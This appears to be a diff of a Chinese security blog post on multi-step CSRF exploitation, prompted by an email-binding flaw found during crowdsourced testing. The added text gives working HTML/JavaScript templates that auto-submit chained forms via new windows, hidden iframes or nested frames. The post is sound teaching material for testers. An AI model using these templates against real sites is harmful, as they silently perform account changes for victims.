@@ -22,7 +22,11 @@ CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论�
 CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论的CSRF利用多是发送一次请求。比如CSRF刷粉丝，CSRF发微博。这里主要讨论一个稍微复杂点的利用场景。
 最近在众测的时候遇到一个案例，用户绑定邮箱的请求没有防御CSRF。但是大家都知道绑定邮箱这个操作不是一步完成了。这次遇到的这个案例是这样的。用户发送一个申请绑定邮箱的请求，服务器给该邮箱发送一个验证">
 <meta property="og:image" content="http://xdxd.love/images/mulcsrf1.jpg">
-<meta property="og:updated_time" content="2015-12-25T01:54:10.000Z">
+<meta property="og:image" content="http://xdxd.love/images/mulcsrf1.gif">
+<meta property="og:image" content="http://xdxd.love/images/mulcsrf3.jpg!small">
+<meta property="og:image" content="http://xdxd.love/images/mulcsrf4.gif">
+<meta property="og:image" content="http://xdxd.love/images/mulcsrf5.gif">
+<meta property="og:updated_time" content="2015-12-25T01:54:47.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="多步csrf漏洞场景及其利用">
 <meta name="twitter:description" content="发布在了Freebuf上，有删改。
@@ -129,7 +133,59 @@ CSRF的漏洞原理和利用方式这里就不多赘述了。平时大家讨论�
 </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
 <span class="tag">&lt;/<span class="title">body</span>&gt;</span>
 <span class="tag">&lt;/<span class="title">html</span>&gt;</span>
-</code></pre>  
+</code></pre><p>测试发现这想法太天真了。第一个表单提交之后，就会跳转到返回的结果页面了。第二个表单不会提交了。而且这里遇到的这个场景比较特殊，并不是仅仅是先后提交两个表单就可以了。第二个表单里的值(验证码)是需要第一个表单提交之后，从邮箱里读出来再放到第二个表单里。<br>测试结果见下图：只会发送第一个表单的请求。</p>
+<p><img src="/images/mulcsrf1.gif" alt=""></p>
+<p>经过查找资料。找到几个解决方案。</p>
+<p>解决方案1：<br>使用form的target属性。target 属性规定在何处打开 action URL。</p>
+<p><img src="/images/mulcsrf3.jpg!small" alt=""></p>
+<p>根据查到的资料。默认是_self。所以会跳到结果页。我们使用_blank试试。</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>  <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/first.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test1"</span> <span class="attribute">value</span>=<span class="value">"1"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form1"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form2"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">target</span>=<span class="value">'_blank'</span> <span class="attribute">action</span>=<span class="value">" https://www.example.com/second.aspx"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"test2"</span> <span class="attribute">value</span>=<span class="value">"2"</span>&gt;</span>
+<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"form2"</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
+<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
+<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
+<span class="built_in">window</span>.setTimeout( <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>{ <span class="built_in">document</span>.forms.form2.submit()}, <span class="number">12000</span>); 
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>这种方式可以实现两次post的需求，不过太过暴力。需要新弹出窗口不说。弹出窗口也很可能被浏览器拦截掉。</p>
+<p><img src="/images/mulcsrf4.gif" alt=""></p>
+<p>解决方案2：</p>
+<p>target可以选择一个frame。framename  在指定的框架中打开。<br>所以可以这样写。这样子可以比较优雅的发两个post请求。</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form id=<span class="string">"form1"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe1' action=<span class="string">"https://www.baidu.com/first.aspx"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test1"</span> value=<span class="string">"1"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form1"</span>&gt;
+&lt;/form&gt;
+&lt;form id=<span class="string">"form2"</span> <span class="keyword">method</span>=<span class="string">"POST"</span> target='csrfIframe2' action=<span class="string">"https://www.baidu.com/second.aspx"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"hidden"</span> name=<span class="string">"test2"</span> value=<span class="string">"2"</span>&gt;
+&lt;input <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"form2"</span>&gt;
+&lt;/form&gt;
+window.onload = function() {
+document.getElementById(<span class="string">"form1"</span>).submit();
+// to make <span class="number">2</span>nd form wait <span class="keyword">for</span> <span class="number">1</span>st, put the following <span class="keyword">in</span> a function <span class="keyword">and</span> use <span class="keyword">as</span> a callback <span class="keyword">for</span> a new timer
+document.getElementById(<span class="string">"form2"</span>).submit();
+}
+&lt;/script&gt;
+&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe1"</span>&gt;&lt;/iframe&gt;
+&lt;iframe style=<span class="string">"display: hidden"</span> height=<span class="string">"0"</span> width=<span class="string">"0"</span> frameborder=<span class="string">"0"</span> name=<span class="string">"csrfIframe2"</span>&gt;&lt;/iframe&gt;
+&lt;/body&gt; &lt;/html&gt;
+</code></pre><p><img src="/images/mulcsrf5.gif" alt=""></p>
+<p>解决方案3<br>使用iframe自然也是可以的。类似</p>
+<pre><code>&lt;<span class="tag">iframe</span> src=<span class="string">"2post3.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
+&lt;/iframe&gt;
+&lt;<span class="tag">iframe</span> src=<span class="string">"2post4.html"</span> <span class="attribute">width</span>=<span class="string">"0"</span> <span class="attribute">height</span>=<span class="string">"0"</span>&gt;
+&lt;/iframe&gt;
+</code></pre><p>就不演示了。</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
